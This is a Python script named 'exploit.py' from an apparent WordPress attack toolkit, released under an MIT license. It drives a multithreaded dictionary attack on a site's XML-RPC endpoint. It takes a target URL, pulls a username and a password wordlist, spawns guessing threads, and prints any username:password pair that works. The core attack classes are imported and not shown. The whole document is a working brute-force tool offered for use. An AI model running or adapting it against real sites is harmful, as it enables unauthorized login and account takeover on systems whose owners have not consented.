#!/usr/bin/python3
# XMLRPC Exploit
#
# Author : Relarizky
# Github : @relarizky (https://github.com/relarizky)
# File   : exploit.py
# Last Modified : 12/1/20, 01:35 AM
#
# Copyright (c) 2020 Relarizky
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


from sys import argv
from wpxploit.xmlrpc.exploit import DictionaryAttack
from wpxploit.xmlrpc.requester import XmlrpcDoesNotExist
from wpxploit.general.wordlist import read_word_list, show_word_list
from wpxploit.general.interface import (
    help, banner, current_time,
    url_check, connection_check,
    get_user_name
)


@banner
@url_check
@connection_check
def main(url: str, thread_size: int, timeout: int) -> None:
    user_name = get_user_name()
    word_list = show_word_list()

    word_chunks = read_word_list(word_list, thread_size)
    thread_list = []
    result = None

    for pass_word in word_chunks:
        if pass_word == []:
            continue
        try:
            thread = DictionaryAttack(url, user_name, pass_word, timeout)
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        except XmlrpcDoesNotExist as message:
            print(current_time(), message)
            break

    for thread in thread_list:
        try:
            result = thread.join()
            if result is not None:
                break
        except KeyboardInterrupt:
            if thread.is_alive():
                thread.stop()
                thread.join()

    if result is not None:
        print(current_time(), "{}:{} is valid!".format(
              result.get("user_name"), result.get("pass_word")))

    print(current_time(), "all task are done!")


if __name__ == "__main__":
    if len(argv) != 4:
        help()
    url, thread, timeout = argv[1], int(argv[2]), int(argv[3])
    main(url, thread, timeout)
